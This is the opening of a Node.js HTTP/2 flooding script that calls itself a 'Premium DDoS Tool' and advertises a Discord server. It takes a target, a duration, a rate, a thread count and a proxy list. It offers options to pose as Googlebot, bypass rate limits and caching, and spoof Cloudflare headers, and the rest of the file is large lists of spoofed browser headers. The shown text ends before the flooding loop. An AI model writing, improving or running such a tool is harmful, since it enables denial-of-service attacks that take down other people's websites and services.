const os = require("os");
const path = require("path");
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const axios = require("axios");

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  Rate: parseInt(process.argv[4]) || 1,
  threads: parseInt(process.argv[5]) || os.cpus().length,
  proxyFile: process.argv[6]
};


if (process.argv.length < 7) {
  showBanner();
  console.log("Usage: node " + __filename + " <target> <time> <rate> <threads> <proxyfile>");
  process.exit(1);
}
const filename = path.basename(__filename);
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const timestamp = Date.now();
(function () {
  const mieke = function () {
    let palynn;
    try {
      palynn = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (amadea) {
      palynn = window;
    }
    return palynn;
  };
  const adhemar = mieke();
})();
const timestampString = timestamp.toString().substring(0, 10);
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
function showBanner() {
  console.clear();
  console.log("[36m\n   ▄██████▄     ▄████████    ▄████████  ▄█    █▄   ▄█      ███     ███    █▄     ▄████████          \n  ███    ███   ███    ███   ███    ███ ███    ███ ███  ▀█████████▄ ███    ███   ███    ███          \n  ███    █▀    ███    ███   ███    ███ ███    ███ ███▌    ▀███▀▀██ ███    ███   ███    █▀           \n ▄███         ▄███▄▄▄▄██▀   ███    ███ ███    ███ ███▌     ███   ▀ ███    ███   ███                 \n▀▀███ ████▄  ▀▀███▀▀▀▀▀   ▀███████████ ███    ███ ███▌     ███     ███    ███ ▀███████████          \n  ███    ███ ▀███████████   ███    ███ ███    ███ ███      ███     ███    ███          ███          \n  ███    ███   ███    ███   ███    ███ ███    ███ ███      ███     ███    ███    ▄█    ███          \n  ████████▀    ███    ███   ███    █▀   ▀██████▀  █▀      ▄████▀   ████████▀   ▄████████▀         \n               ███    ███                                                                       \n  [0m");
  console.log("[1m[37m Gravitus - Premium DDoS Tool v1[0m");
  console.log("[2m════════════════════════════════════════════════════════════[0m");
  console.log("[33mDeveloped by Gravitus and m85 | Discord: https://discord.gg/S7Cp94S7nU[0m");
  console.log("[2m════════════════════════════════════════════════════════════[0m");
  console.log("[2m════════════════════════════════════════════════════════════[0m");
  console.log("[34mTweaks:[0m");
  console.log("[34m" + ("  --bfm Emulate Googlebot to bypass bot protection [" + (process.argv.includes("--bfm") ? "[32mACTIVE" : "[31mINACTIVE") + "[34m" + "]") + "[0m");
  console.log("[34m" + ("  --ratelimit Add random query strings to bypass rate limits [" + (process.argv.includes("--ratelimit") ? "[32mACTIVE" : "[31mINACTIVE") + "[34m" + "]") + "[0m");
  console.log("[34m" + ("  --spoof Spoof Cloudflare headers for enhanced bypass [" + (process.argv.includes("--spoof") ? "[32mACTIVE" : "[31mINACTIVE") + "[34m" + "]") + "[0m");
  console.log("[34m" + ("  --origin Use random origin headers to mimic traffic [" + (process.argv.includes("--origin") ? "[32mACTIVE" : "[31mINACTIVE") + "[34m" + "]") + "[0m");
  console.log("[34m" + ("  --cache Bypass caching with dynamic cache headers [" + (process.argv.includes("--cache") ? "[32mACTIVE" : "[31mINACTIVE") + "[34m" + "]") + "[0m");
  console.log("[2m════════════════════════════════════════════════════════════[0m");
}
const parsedUrl = url.parse(args.target);
function readLines(mariadel) {
  return fs.readFileSync(mariadel, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(dejarae, jaimy) {
  const gayel = {
    phrfb: function (willow, rubee) {
      return willow + rubee;
    }
  };
  gayel.cekHv = function (vern, tavis) {
    return vern * tavis;
  };
  gayel.sLcgO = function (ziann, erionne) {
    return ziann - erionne;
  };
  return Math.floor(gayel.cekHv(Math.random(), gayel.sLcgO(jaimy, dejarae)) + dejarae);
}
function randomElement(beverlee) {
  return beverlee[randomIntn(0, beverlee.length)];
}
function randstr(kirsty) {
  let rio = "";
  const milliona = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
  for (let jewelee = 0; jewelee < kirsty; jewelee++) {
    rio += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * milliona));
  }
  return rio;
}
function generateRandomString(lumina, inbal) {
  const jayse = {
    UdGdi: function (shequanna, andrica) {
      return shequanna !== andrica;
    }
  };
  jayse.tMMGo = "ZVjVH";
  jayse.QJkjw = function (jahnvi, annyssa) {
    return jahnvi * annyssa;
  };
  jayse.IJRjk = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  jayse.mcPqD = function (solangel, lamese) {
    return solangel + lamese;
  };
  jayse.qBtKs = function (leila, keao) {
    return leila * keao;
  };
  jayse.Elvan = function (treyvone, sudeys) {
    return treyvone - sudeys;
  };
  const glyn = jayse.IJRjk;
  const belisa = jayse.mcPqD(Math.floor(jayse.qBtKs(Math.random(), jayse.mcPqD(jayse.Elvan(inbal, lumina), 1))), lumina);
  const ayana = {
    length: belisa
  };
  const aasha = Array.from(ayana, () => {
    if (jayse.tMMGo !== jayse.tMMGo) {
      const matsue = _0x1a0c27.apply(_0x531868, arguments);
      _0x508beb = null;
      return matsue;
    } else {
      const rylei = Math.floor(jayse.QJkjw(Math.random(), glyn.length));
      return glyn[rylei];
    }
  });
  return aasha.join("");
}
const userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15", "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)", "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1", "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1", "portalmmm/2.0 N410i(c20;TB) ", "Python-urllib/2.5", "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3", "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)", "SearchExpress", "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)", "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0", "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT100/R101", "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00", "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00", "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10", "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01", "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10", "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30", "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0", "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT68/R201A", "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]", "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0", "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102", "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0", "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123", "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36", "Peach/1.01 (Ubuntu 8.04 LTS; U; en)", "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1", "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1", "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3", "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)", "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)", "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0", "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT100/R101", "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0", "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT68/R201A", "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]", "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0", "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SuperBot/4.4.0.60 (Windows XP)", "Uzbl (Webkit 1.3) (Linux i686 [i686])", "Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1", "W3C_Validator/1.305.2.12 libwww-perl/5.64", "W3C_Validator/1.654", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36"];
const googleBotAgents = ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.90 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Googlebot/2.1 (+http://www.google.com/bot.html)"];
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"];
const language_header = ["ko-KR", "en-US", "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA", "en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA", "en-IN", "en-PH", "en-SG", "en-HK", "en-GB,en;q=0.8", "en-GB,en;q=0.9", "en-GB,en;q=0.7", "en-US,en;q=0.9", "en-CA,en;q=0.9", "en-AU,en;q=0.9", "en-NZ,en;q=0.9", "en-ZA,en;q=0.9", "en-IE,en;q=0.9", "en-IN,en;q=0.9", "ar-SA,ar;q=0.9", "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", "bg-BG,bg;q=0.9", "bn-IN,bn;q=0.9", "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", "cy-GB,cy;q=0.9", "da-DK,da;q=0.9", "de-DE,de;q=0.9", "el-GR,el;q=0.9", "es-ES,es;q=0.9", "et-EE,et;q=0.9", "eu-ES,eu;q=0.9", "fa-IR,fa;q=0.9", "fi-FI,fi;q=0.9", "fr-FR,fr;q=0.9", "ga-IE,ga;q=0.9", "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "he-IL,he;q=0.9", "hi-IN,hi;q=0.9", "hr-HR,hr;q=0.9", "hu-HU,hu;q=0.9", "hy-AM,hy;q=0.9", "id-ID,id;q=0.9", "is-IS,is;q=0.9", "it-IT,it;q=0.9", "ja-JP,ja;q=0.9", "ka-GE,ka;q=0.9", "kk-KZ,kk;q=0.9", "km-KH,km;q=0.9", "kn-IN,kn;q=0.9", "ko-KR,ko;q=0.9", "ky-KG,ky;q=0.9", "lo-LA,lo;q=0.9", "lt-LT,lt;q=0.9", "lv-LV,lv;q=0.9", "mk-MK,mk;q=0.9", "ml-IN,ml;q=0.9", "mn-MN,mn;q=0.9", "mr-IN,mr;q=0.9", "ms-MY,ms;q=0.9", "mt-MT,mt;q=0.9", "my-MM,my;q=0.9", "nb-NO,nb;q=0.9", "ne-NP,ne;q=0.9", "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", "th-TH,th;q=0.9", "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", "am-ET,am;q=0.8", "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", "bs-Latn-BA,bs;q=0.8", "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", "km-KH,km;q=0.8", "kok-IN,kok;q=0.8", "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", "mn-Mong-CN,mn;q=0.8", "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", "nso-ZA,nso;q=0.8", "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", "sd-Arab-PK,sd;q=0.8", "se-NO,se;q=0.8", "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
const encoding_header = ["gzip, deflate, br", "gzip, deflate, br, zstd", "compress, gzip", "deflate, gzip", "gzip, identity", "*", "*/*", "gzip", "br", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip;q=1.0, identity; q=0.5, *;q=0", "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", "identity", "gzip, compress", "compress, deflate", "compress", "gzip, deflate, lzma, sdch", "deflate"];
